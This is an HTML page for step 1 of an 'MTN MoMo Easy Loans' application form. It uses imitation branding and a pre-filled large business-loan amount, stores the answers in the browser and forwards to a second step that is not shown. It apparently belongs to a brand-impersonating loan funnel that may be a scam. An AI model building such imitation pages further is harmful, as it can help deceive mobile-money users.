<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MTN MoMo – Easy Loans</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --mtn-dark: #003366;
    --mtn-gold: #FFD700;
    --mtn-light: #004080;
    --grad: linear-gradient(to right, #003366, #004080);
    --page-bg: #F5F5F5;
    --white: #FFFFFF;
    --text-dark: #1C2340;
    --text-mid: #444;
    --text-light: #888;
    --border: #ddd;
    --radius: 12px;
    --radius-sm: 8px;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Inter', sans-serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }

  .mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 4px; }
  .mtn-logo-icon { width: 45px; height: 45px; background: var(--mtn-gold); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; font-weight: 900; color: var(--mtn-dark); position: relative; }
  .mtn-logo-icon::after { content: 'M'; font-size: 2rem; font-weight: 900; }
  .mtn-logo-text { font-size: 1rem; font-weight: 700; color: var(--mtn-dark); }
  .mtn-logo-sub { font-size: 0.65rem; color: #888; font-weight: 500; }

  /* NAV */
  .navbar { background: var(--mtn-dark); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
  .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.6); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; }
  .nav-left:hover { color:#fff; }
  .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
  .hline { width:20px; height:2px; background:rgba(255,255,255,0.6); border-radius:1px; }

  .btn-grad { background: var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; width:100%; font-family:'Inter',sans-serif; transition:opacity 0.2s; }
  .btn-grad:hover { opacity:0.9; }
  .btn-gray { background:#e0e0e0; color:#666; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; flex:1; font-family:'Inter',sans-serif; transition:background 0.2s; }
  .btn-gray:hover { background:#d0d0d0; }

  .field { margin-bottom:18px; }
  .field label { display:block; font-size:0.82rem; font-weight:500; color:var(--text-mid); margin-bottom:6px; }
  .field input, .field select, .field textarea { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:'Inter',sans-serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; appearance:none; -webkit-appearance:none; }
  .field input:focus, .field select:focus, .field textarea:focus { border-color:var(--mtn-gold); box-shadow:0 0 0 3px rgba(255,215,0,0.2); }
  .field textarea { resize:vertical; min-height:90px; }
  .sel-wrap { position:relative; }
  .sel-wrap::after { content:'▾'; position:absolute; right:14px; top:50%; transform:translateY(-50%); color:var(--text-light); pointer-events:none; font-size:0.9rem; }

  .step-center { flex:1; display:flex; align-items:flex-start; justify-content:center; padding:28px 16px; }
  .step-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.08); padding:32px 28px; }
  .step-card h2 { font-size:1.25rem; font-weight:700; text-align:center; margin-bottom:4px; }
  .step-sub { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:4px; }

  .prog-row { display:flex; gap:8px; margin:10px 0 24px; }
  .prog-seg { flex:1; height:4px; border-radius:2px; background:#e0e0e0; transition:background 0.3s; }
  .prog-seg.done { background:var(--mtn-gold); }
  .prog-seg.now  { background:var(--mtn-gold); }

  .msg-box { border-radius:var(--radius-sm); padding:12px 16px; font-size:0.84rem; margin-bottom:16px; display:none; align-items:center; gap:10px; }
  .msg-box.show { display:flex; }
  .msg-box.error   { background:#fef2f2; border:1.5px solid #fecaca; color:#991b1b; }
  .msg-icon { font-weight:700; }

  .pg-footer { margin-top:auto; padding:14px; text-align:center; font-size:0.78rem; color:var(--text-light); background:#fff; border-top:1px solid #eee; flex-shrink:0; }

  .step-btns { display:flex; gap:12px; margin-top:8px; }
  .step-btns .btn-grad { flex:1; }
</style>
</head>
<body>
  <nav class="navbar">
    <a class="nav-left" href="/">← Back</a>
    <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
      <div class="mtn-logo-icon" style="width: 32px; height: 32px; font-size: 1.2rem;">M</div>
      <div style="text-align: left;">
        <div class="mtn-logo-text" style="font-size: 0.9rem;">MTN MoMo</div>
        <div class="mtn-logo-sub" style="font-size: 0.6rem;">Loans</div>
      </div>
    </div>
    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
  </nav>
  <div class="step-center">
    <div class="step-card">
      <h2>Loan Application</h2>
      <p class="step-sub">Step 1 of 3</p>
      <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
      <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
      <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div></div>
      <div class="field"><label>Loan Amount (ZMW)</label><input type="number" id="s1am" value="1000000" placeholder="Enter amount" oninput="clearErr('s1Err')"></div>
      <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
      <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
      <button class="btn-grad" onclick="toS2()">NEXT STEP</button>
    </div>
  </div>
  <div class="pg-footer">© 2026 MTN MoMo Loans</div>

  <script>
    const S = { loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '' };

    function clearErr(id) { document.getElementById(id).classList.remove('show'); }
    function showErr(id, msg) {
      document.getElementById(id).classList.add('show');
      document.getElementById(id + 'Txt').textContent = msg;
    }

    function toS2() {
      const ty = document.getElementById('s1ty').value;
      const am = +document.getElementById('s1am').value;
      const te = document.getElementById('s1te').value;
      const pu = document.getElementById('s1pu').value;

      if (!ty || am <= 0 || !te || !pu.trim()) {
        showErr('s1Err', 'Please complete all fields.');
        return;
      }

      S.loanType = ty;
      S.loanAmount = am;
      S.loanTerm = te;
      S.loanPurpose = pu;

      // Store in localStorage for next steps
      localStorage.setItem('loanType', ty);
      localStorage.setItem('loanAmount', am);
      localStorage.setItem('loanTerm', te);
      localStorage.setItem('loanPurpose', pu);

      window.location.href = '/step2';
    }
  </script>
</body>
</html>
